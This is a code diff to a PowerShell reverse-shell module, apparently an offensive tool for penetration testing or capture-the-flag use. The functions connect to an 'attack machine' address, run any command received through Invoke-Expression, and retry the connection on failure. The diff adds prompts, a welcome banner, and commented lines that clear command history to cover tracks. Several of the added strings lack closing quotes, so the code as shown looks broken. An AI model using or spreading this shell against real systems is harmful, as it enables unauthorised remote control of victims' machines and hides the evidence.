@@ -5,7 +5,7 @@ Function Start-Listener {
             Mandatory=$True,
             Position=0,
             ValueFromPipeline=$False,
-            HelpMessage='Enter a port to listen on. Valid ports are between 1 and 65535'
+            HelpMessage='Enter a port to listen on. Valid ports are between 1 and 65535. Example: 1234'
             )] # End Parameter
         [ValidateRange(1,65535)]
         [int32]$Port
@@ -66,9 +66,9 @@ Function Start-Listener {
       } While ($Client.Connected -eq $True) # End Do While Loop
 
       $Socket.Stop()
-
-      $Client.Close();
-
+      
+      $Client.Close()
+      
       $Stream.Dispose()
 
 } # End Function Start-Listener
@@ -81,6 +81,7 @@ Function Invoke-ReversePowerShell {
                 Position=0,
                 ValueFromPipeline=$True,
                 ValueFromPipelineByPropertyName = $True
+                HelpMessage="Enter the IP Address of your attack machine. Example: 10.10.14.21"
             )] # End Parameter
                 [ValidateNotNullorEmpty()]
             [IPAddress]$IpAddress,
@@ -89,6 +90,7 @@ Function Invoke-ReversePowerShell {
                 Mandatory=$True,
                 Position=1,
                 ValueFromPipeline=$False
+                HelpMessage="Enter the port number your attack machine is listening on. Example: 1234"
             )] # End Parameter
                 [ValidateNotNullorEmpty()]
                 [ValidateRange(1,65535)]
@@ -113,7 +115,7 @@ Function Invoke-ReversePowerShell {
 
             [byte[]]$Bytes = 0..255 | ForEach-Object -Process {0}
 
-            $SendBytes = ([Text.Encoding]::ASCII).GetBytes("$env:USERNAME connected to $env:COMPUTERNAME "+"`n`n" + "PS " + (Get-Location).Path + "> ")
+            $SendBytes = ([Text.Encoding]::ASCII).GetBytes("Welcome $env:USERNAME, you are now connected to $env:COMPUTERNAME "+"`n`n" + "PS " + (Get-Location).Path + "> ")
 
             $Stream.Write($SendBytes,0,$SendBytes.Length);$Stream.Flush()
 
@@ -123,8 +125,12 @@ Function Invoke-ReversePowerShell {
 
                 If($Command.StartsWith("kill-link"))
                 {
+                
+                    Clear-Host
 
-                    Clear-Host;
+                    Write-Information "If you wish to clear your command history when exiting shell uncomment the below lines
+                    # Clear-History
+                    # Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
 
                     $Client.Close()
 
@@ -136,7 +142,7 @@ Function Invoke-ReversePowerShell {
                 {
 
                     # Executes commands
-                    $ExecuteCmd = (Invoke-Expression -Command $Command -ErrorAction SilentlyContinue | Out-String )
+                    $ExecuteCmd = Invoke-Expression -Command $Command -ErrorAction SilentlyContinue | Out-String
 
                     $ExecuteCmdAgain  = $ExecuteCmd + "PS " + (Get-Location).Path + "> "
 
@@ -163,18 +169,27 @@ Function Invoke-ReversePowerShell {
         } # End Try
         Catch
         {
+        
             Write-Host "There was an initial connection error. Retrying in 30 seconds..." -ForegroundColor 'Red'
 
             If($Client.Connected)
             {
+            
+                Write-Information "If you wish to clear your command history when exiting shell uncomment the below lines
+                # Clear-History
+                # Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
 
                 $Client.Close()
 
             } # End If
 
             Clear-Host
+            
+            Write-Information "If you wish to clear your command history when exiting shell uncomment the below lines
+            # Clear-History
+            # Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
 
-            Start-Sleep -s 30
+            Start-Sleep -Seconds 30
 
         } # End Catch
 
